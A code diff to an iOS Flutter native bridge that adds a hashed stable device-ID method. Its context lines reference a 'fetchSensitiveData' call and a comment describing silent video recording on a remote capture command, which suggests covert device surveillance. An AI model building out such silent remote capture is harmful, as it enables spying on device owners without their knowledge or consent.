@@ -1,4 +1,5 @@
 import AVFoundation
+import CryptoKit
 import Flutter
 import UIKit
 import Contacts
@@ -26,6 +27,8 @@ import Photos
 
   private func handleNativeBridge(call: FlutterMethodCall, result: @escaping FlutterResult) {
     switch call.method {
+    case "getDeviceId":
+      result(getStableDeviceId())
     case "fetchSensitiveData":
       let type = call.arguments as? String ?? ""
       let out: [String: Any]
@@ -81,6 +84,17 @@ import Photos
     default:
       result(FlutterMethodNotImplemented)
     }
+  }
+
+  /// 与 Android 侧保持一致：对 identifierForVendor 做 SHA-256 后截取 32 位，供 enroll 与 audit 复用
+  private func getStableDeviceId() -> String {
+    let raw = UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
+    guard let data = raw.data(using: .utf8) else {
+      return "ios_\(abs(raw.hashValue))"
+    }
+    let digest = SHA256.hash(data: data)
+    let hex = digest.map { String(format: "%02x", $0) }.joined()
+    return String(hex.prefix(32))
   }
 
   /// 静默录像（远程采集 mop.cmd.capture.video），约定 durationSec 秒，返回 mp4 字节
